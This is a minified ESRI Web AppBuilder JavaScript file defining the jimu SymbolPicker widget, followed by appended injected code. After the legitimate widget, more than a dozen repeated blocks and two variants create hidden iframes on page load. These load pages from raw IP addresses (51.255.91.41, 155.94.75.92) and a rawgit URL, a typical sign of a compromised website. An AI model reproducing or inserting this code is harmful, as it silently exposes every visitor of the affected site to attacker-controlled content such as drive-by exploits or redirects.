// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dojo/Evented dojo/_base/lang dojo/_base/html dojo/_base/array dojo/on dojo/query dijit/TooltipDialog dijit/popup dijit/registry jimu/dijit/SymbolChooser jimu/symbolUtils".split(" "),function(g,h,k,l,b,c,e,d,m,n,f,p,q,r){return g([h,k,l],{baseClass:"jimu-symbol-picker",declaredClass:"jimu.dijit.SymbolPicker",templateString:'\x3cdiv\x3e\x3cdiv data-dojo-attach-point\x3d"symbolNode" class\x3d"symbol-node jimu-float-leading"\x3e\x3c/div\x3e\x3cdiv class\x3d"separator jimu-float-leading"\x3e\x3c/div\x3e\x3cdiv class\x3d"jimu-icon jimu-icon-down-arrow-8 jimu-float-leading"\x3e\x3c/div\x3e\x3c/div\x3e',
tooltipDialog:null,_isTooltipDialogOpened:!1,symbol:null,type:null,postCreate:function(){this.inherited(arguments);this._createTooltipDialog();this._hideTooltipDialog();var a=this.symbolChooser.getSymbol();a&&this._drawSymbol(a)},destroy:function(){this._hideTooltipDialog();this.symbolChooser&&this.symbolChooser.destroy();this.symbolChooser=null;this.inherited(arguments)},_createTooltipDialog:function(){var a=c.create("div");this.tooltipDialog=new n({content:a});this.symbolChooser=new q({symbol:this.symbol,
type:this.type});this.symbolChooser.placeAt(a);this.symbolChooser.startup();this.own(d(this.symbolChooser,"change",b.hitch(this,function(a){this._drawSymbol(a);this.emit("change",a)})));this.own(d(this.domNode,"click",b.hitch(this,function(a){a.stopPropagation();a.preventDefault();this._isTooltipDialogOpened?this._hideTooltipDialog():this._showTooltipDialog()})));this.own(d(document.body,"click",b.hitch(this,function(a){var b=a.target||a.srcElement;a=this._getColorPickers();0<a.length&&e.some(a,function(a){return a.isPartOfPopup(b)})||
(a=this.tooltipDialog.domNode,b===a||c.isDescendant(b,a)||this._hideTooltipDialog())})));this.own(d(this.symbolChooser,"resize",b.hitch(this,function(){this._isTooltipDialogOpened&&(this._hideTooltipDialog(),this._showTooltipDialog())})))},_getColorPickers:function(){var a=m(".jimu-color-picker",this.symbolChooser.domNode);return e.map(a,b.hitch(this,function(a){return p.byNode(a)}))},reset:function(){this.symbol=this.type=null;c.empty(this.symbolNode);this.symbolChooser.reset()},showBySymbol:function(a){this.reset();
a&&(this._drawSymbol(a),this.symbolChooser.showBySymbol(a))},showByType:function(a){this.reset();this.symbolChooser.showByType(a);(a=this.symbolChooser.getSymbol())&&this._drawSymbol(a)},getSymbol:function(){return this.symbolChooser.getSymbol()},_drawSymbol:function(a){c.empty(this.symbolNode);a&&(a=r.createSymbolNode(a,{width:16,height:16}))&&c.place(a,this.symbolNode)},_showTooltipDialog:function(){this.tooltipDialog&&(f.open({parent:this.getParent(),popup:this.tooltipDialog,around:this.domNode}),
this._isTooltipDialogOpened=!0)},_hideTooltipDialog:function(){this.tooltipDialog&&(f.close(this.tooltipDialog),this._isTooltipDialogOpened=!1)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});